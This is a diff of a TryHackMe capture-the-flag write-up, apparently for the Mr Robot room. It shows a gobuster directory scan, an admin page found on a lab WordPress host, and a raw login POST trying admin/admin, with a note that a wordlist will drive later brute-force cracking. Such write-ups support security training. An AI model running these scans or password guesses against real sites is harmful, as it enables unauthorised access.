@@ -78,25 +78,49 @@ root@ip-10-10-140-73:~# curl http://10.10.90.47/key-1-of-3.txt
 
 We should also go ahead and download a copy of `fsocity.dic`.  Having a look at its contents, it appears to be some kind of wordlist.  Based on past expereinces with similar CTF challenges, this indicates that we'll probably be needing this wordlist to perform a bruteforce password cracking at some point later on.
 
-For the time being, let's take a closer look at the website and see whether we can find an interestiugn directories.  We can use `gobuster` with a small wordlist for this:
+For the time being, let's take a closer look at the website and see whether we can find an interestiugn directories.  We can use `gobuster` with a medium wordlist for this:
 
 ```console
-root@ip-10-10-140-73:~# gobuster dir -u http://10.10.90.47 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 1000 -q
-/license (Status: 200)
-/blog (Status: 301)
-/sitemap (Status: 200)
-/js (Status: 301)
-/rss (Status: 301)
-/login (Status: 302)
+root@ip-10-10-140-73:~# gobuster dir -u http://10.10.90.47 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 1000 -q
+/video (Status: 301)
 /admin (Status: 301)
+/wp-content (Status: 301)
+/atom (Status: 301)
+/0 (Status: 301)
+/audio (Status: 301)
+/feed (Status: 301)
+/css (Status: 301)
+/intro (Status: 200)
+/images (Status: 301)
+/sitemap (Status: 200)
+/image (Status: 301)
+/Image (Status: 301)
+/wp-login (Status: 200)
+/rss2 (Status: 301)
 ```
 
-Interestingly we can see a `/login` page and if we try accessing this we are redirected to `wp-login.php`, which is a Wordpress login page! :)
+Interestingly we can see a `/wp-login` page and if we try accessing this we are served a Wordpress login page! :)
 
 ![image](https://github.com/beta-j/TryHackMe-Rooms/assets/60655500/949e60a1-f0b6-494e-9090-01ccdeb9f84e)
 
 
+```http
+POST /wp-login.php HTTP/1.1
+Host: 10.10.90.47
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 100
+Origin: http://10.10.90.47
+Connection: close
+Referer: http://10.10.90.47/wp-login.php
+Cookie: s_cc=true; s_fid=5C779EDA99811D07-07120F123BF26DC4; s_nr=1707297020912; s_sq=%5B%5BB%5D%5D; wordpress_test_cookie=WP+Cookie+check
+Upgrade-Insecure-Requests: 1
 
+log=admin&pwd=admin&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.90.47%2Fwp-admin%2F&testcookie=1
+```
 
 
 
